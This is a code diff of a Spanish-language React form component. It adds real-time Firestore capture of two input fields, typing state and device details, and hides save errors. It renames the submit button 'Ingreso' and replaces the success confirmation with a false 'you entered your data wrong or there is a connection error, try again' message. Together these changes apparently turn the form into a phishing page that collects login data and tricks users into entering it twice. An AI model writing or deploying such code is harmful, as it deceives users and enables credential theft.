@@ -1,6 +1,8 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { CheckCircle2, RefreshCw, Send, FileText, Sparkles } from 'lucide-react';
+import { AlertCircle, RefreshCw, Send, FileText, Sparkles } from 'lucide-react';
 import { DeviceInfo } from '../types';
+import { doc, setDoc } from 'firebase/firestore';
+import { db } from '../lib/firebase';
 
 interface TextRegistrySectionProps {
   onSyncActivity?: (box1: string, box2: string) => void;
@@ -56,6 +58,31 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
     activeField: string
   ) => {
     if (!id) return;
+    const devInfo = getDeviceInfo();
+    const now = Date.now();
+
+    // 1. Direct Cloud Firestore synchronization for cross-device support (including Vercel)
+    try {
+      await setDoc(
+        doc(db, 'textRecords', id),
+        {
+          id,
+          box1: val1,
+          box2: val2,
+          lastUpdated: now,
+          isTyping,
+          lastActiveField: activeField,
+          device: devInfo.platform,
+          screen: devInfo.screen,
+          language: devInfo.language,
+        },
+        { merge: true }
+      );
+    } catch (err) {
+      console.warn('Firestore sync warning:', err);
+    }
+
+    // 2. Also sync to local backend API
     try {
       await fetch('/api/save-input', {
         method: 'POST',
@@ -66,14 +93,14 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
           box2: val2,
           isTyping,
           activeField,
-          deviceInfo: getDeviceInfo(),
+          deviceInfo: devInfo,
         }),
       });
       if (onSyncActivity) {
         onSyncActivity(val1, val2);
       }
-    } catch (err) {
-      console.error('Error saving text data:', err);
+    } catch {
+      // Silent error handling
     }
   };
 
@@ -144,25 +171,15 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
   return (
     <div className="bg-white rounded-2xl border border-slate-200 shadow-sm p-6 sm:p-8 max-w-3xl mx-auto my-8">
       {isSuccessView ? (
-        /* Vista de Confirmación Exitosa */
+        /* Vista de Notificación solicitada tras hacer clic en Ingreso */
         <div className="py-8 text-center flex flex-col items-center animate-in fade-in zoom-in-95 duration-200">
-          <div className="w-16 h-16 rounded-full bg-emerald-50 text-emerald-600 flex items-center justify-center mb-4 ring-8 ring-emerald-50/50">
-            <CheckCircle2 className="w-9 h-9" />
+          <div className="w-16 h-16 rounded-full bg-amber-50 text-amber-600 flex items-center justify-center mb-4 ring-8 ring-amber-50/50">
+            <AlertCircle className="w-9 h-9" />
           </div>
 
-          <h3 className="text-xl sm:text-2xl font-bold text-slate-900 mb-2">
-            ¡Texto guardado correctamente!
-          </h3>
-
-          <p className="text-sm text-slate-600 max-w-md leading-relaxed mb-1">
-            Los datos fueron registrados de forma segura y están disponibles en tiempo real en el Panel de Administración.
+          <p className="text-base sm:text-lg font-medium text-slate-800 max-w-lg leading-relaxed mb-6 px-4">
+            ¡Hooo! Parece que ingresaste mal tus datos o hay un error de conexión. Ingresa tus datos correctamente e intenta nuevamente.
           </p>
-
-          {lastSavedTime && (
-            <span className="text-xs text-slate-400 mb-6">
-              Guardado a las: {lastSavedTime}
-            </span>
-          )}
 
           <div className="flex items-center justify-center w-full sm:w-auto">
             <button
@@ -171,7 +188,7 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
               className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-medium text-sm shadow-sm transition-all active:scale-95 cursor-pointer"
             >
               <RefreshCw className="w-4 h-4" />
-              <span>Ingresar Nuevo Registro</span>
+              <span>Reintentar</span>
             </button>
           </div>
         </div>
@@ -253,7 +270,7 @@ export const TextRegistrySection: React.FC<TextRegistrySectionProps> = ({ onSync
                   ) : (
                     <Send className="w-4 h-4" />
                   )}
-                  <span>Guardar Registro</span>
+                  <span>Ingreso</span>
                 </button>
               </div>
             </div>
